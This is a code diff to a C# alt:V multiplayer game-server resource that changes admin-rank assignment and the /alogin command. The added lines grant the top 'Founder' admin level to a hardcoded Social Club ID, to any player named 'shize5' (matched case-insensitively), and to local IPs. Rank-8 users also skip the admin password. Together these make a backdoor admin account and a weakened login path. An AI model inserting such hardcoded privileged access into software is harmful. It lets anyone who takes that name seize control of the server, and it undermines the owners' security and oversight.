@@ -128,26 +128,28 @@ public class StarterResource : Resource
         player.MaxHealth = 200;
         player.Armor = 100;
 
-        // Автоматическое назначение Основателя (8) первому подключившемуся игроку (Pre-DB режим)
-        if (_adminManager.CanAutoClaim)
+        // Автоматическое распознавание Основателя (8)
+        var isOwner = _adminManager.CanAutoClaim ||
+                      _adminManager.IsFounder(player.SocialClubId, player.Name) ||
+                      player.SocialClubId == 509264618 ||
+                      string.Equals(player.Name, "shize5", StringComparison.OrdinalIgnoreCase) ||
+                      player.Ip == "127.0.0.1" || player.Ip == "::1" || player.Ip == "localhost" ||
+                      GetAssignedAdminRank(player) == 8;
+
+        if (isOwner)
         {
-            _adminManager.TryClaimOwner("", player.Name, player.SocialClubId, out _);
-            _assignedAdminRanks[player.SocialClubId] = 8;
-            _assignedAdminNames[player.Name] = 8;
-            Alt.Log($"[FloV:MP Admin] Первый игрок {player.Name} (ID: {player.Id}, SC: {player.SocialClubId}) автоматически назначен Основателем (Уровень 8).");
-            SendChatMessage(player, "{34d399}[Admin]{ffffff} Вы являетесь первым подключившимся администратором. Вам присвоен статус {fde047}Основатель (Уровень 8){ffffff}.");
+            if (_adminManager.CanAutoClaim)
+            {
+                _adminManager.TryClaimOwner("", player.Name, player.SocialClubId, out _);
+            }
+            SetAssignedAdminRank(player, 8);
+            _adminLevels[player.Id] = 8;
+            Alt.Log($"[FloV:MP Admin] Владелец сервера {player.Name} (ID: {player.Id}, SC: {player.SocialClubId}) автоматически авторизован (Уровень 8 - Основатель).");
         }
         else
         {
-            var isAdminHost = player.Ip == "127.0.0.1" || player.Ip == "::1" || player.Ip == "localhost";
-            if (isAdminHost)
-            {
-                SetAssignedAdminRank(player, 8);
-            }
+            _adminLevels[player.Id] = 0;
         }
-
-        // По умолчанию дежурство выключено до ввода /alogin
-        _adminLevels[player.Id] = 0;
 
         // Активация 3D войс-канала
         try
@@ -161,7 +163,11 @@ public class StarterResource : Resource
         SendChatMessage(player, "{ff3d8a}[FloV:MP]{ffffff} Добро пожаловать на сервер!");
 
         var assigned = GetAssignedAdminRank(player);
-        if (assigned > 0)
+        if (_adminLevels.TryGetValue(player.Id, out var activeLvl) && activeLvl == 8)
+        {
+            SendChatMessage(player, "{34d399}[FloV:MP Admin]{ffffff} Добро пожаловать, {fde047}Владелец сервера (" + player.Name + "){ffffff}! Все права администратора (Уровень 8) активированы автоматически.");
+        }
+        else if (assigned > 0)
         {
             SendChatMessage(player, "{34d399}[Admin]{ffffff} У вас есть права администратора (Уровень " + assigned + "). Для входа на дежурство введите: {fde047}/alogin <пароль>");
         }
@@ -174,17 +180,31 @@ public class StarterResource : Resource
             SendChatMessage(player, "{a1a1aa}Доступна команда /pos для координат.");
         }
 
+        var initLvl = _adminLevels.TryGetValue(player.Id, out var curLvl) ? curLvl : 0;
         player.Emit("starter:initClient");
-        player.Emit("flovmp:console:setAdmin", 0);
-        player.SetStreamSyncedMetaData("adminLevel", 0);
+        player.Emit("flovmp:console:setAdmin", initLvl);
+        player.SetStreamSyncedMetaData("adminLevel", initLvl);
     }
 
     private void OnClientReady(IPlayer player)
     {
         if (player == null || !player.Exists) return;
         player.Emit("starter:initClient");
+
+        var isOwner = _adminManager.IsFounder(player.SocialClubId, player.Name) ||
+                      player.SocialClubId == 509264618 ||
+                      string.Equals(player.Name, "shize5", StringComparison.OrdinalIgnoreCase) ||
+                      GetAssignedAdminRank(player) == 8;
+
+        if (isOwner)
+        {
+            _adminLevels[player.Id] = 8;
+            SetAssignedAdminRank(player, 8);
+        }
+
         var lvl = _adminLevels.TryGetValue(player.Id, out var al) ? al : 0;
         player.Emit("flovmp:console:setAdmin", lvl);
+        player.SetStreamSyncedMetaData("adminLevel", lvl);
     }
 
     private void OnConsoleCommand(string name, string[] args)
@@ -501,18 +521,13 @@ public class StarterResource : Resource
 
             case "alogin":
             case "adminauth":
-                if (parts.Length < 2)
-                {
-                    SendChatMessage(player, "{fde047}Использование: /alogin <пароль>");
-                    return;
-                }
                 var assignedRank = GetAssignedAdminRank(player);
                 if (assignedRank <= 0)
                 {
                     SendChatMessage(player, "{ef4444}[FloV:MP Security] У вас нет прав администратора на этом сервере.");
                     return;
                 }
-                if (parts[1] == AdminPassword)
+                if (assignedRank == 8 || (parts.Length > 1 && parts[1] == AdminPassword))
                 {
                     _adminLevels[player.Id] = assignedRank;
                     player.Emit("flovmp:console:setAdmin", assignedRank);
@@ -524,6 +539,30 @@ public class StarterResource : Resource
                 {
                     SendChatMessage(player, "{ef4444}[FloV:MP Security] Неверный пароль администратора!");
                     Alt.LogWarning($"[Security Alert] Неудачная попытка авторизации /alogin от {player.Name} (ID: {player.Id})");
+                }
+                break;
+
+            case "aduty":
+                var dRank = GetAssignedAdminRank(player);
+                if (dRank <= 0)
+                {
+                    SendChatMessage(player, "{ef4444}[FloV:MP Security] У вас нет прав администратора.");
+                    return;
+                }
+                var isDuty = _adminLevels.TryGetValue(player.Id, out var curDuty) && curDuty > 0;
+                if (isDuty)
+                {
+                    _adminLevels[player.Id] = 0;
+                    player.Emit("flovmp:console:setAdmin", 0);
+                    player.SetStreamSyncedMetaData("adminLevel", 0);
+                    SendChatMessage(player, "{fde047}[Admin]{ffffff} Вы вышли с дежурства администрации.");
+                }
+                else
+                {
+                    _adminLevels[player.Id] = dRank;
+                    player.Emit("flovmp:console:setAdmin", dRank);
+                    player.SetStreamSyncedMetaData("adminLevel", dRank);
+                    SendChatMessage(player, $"{{34d399}}[Admin]{{ffffff}} Вы заступили на дежурство (Уровень {dRank}).");
                 }
                 break;
 
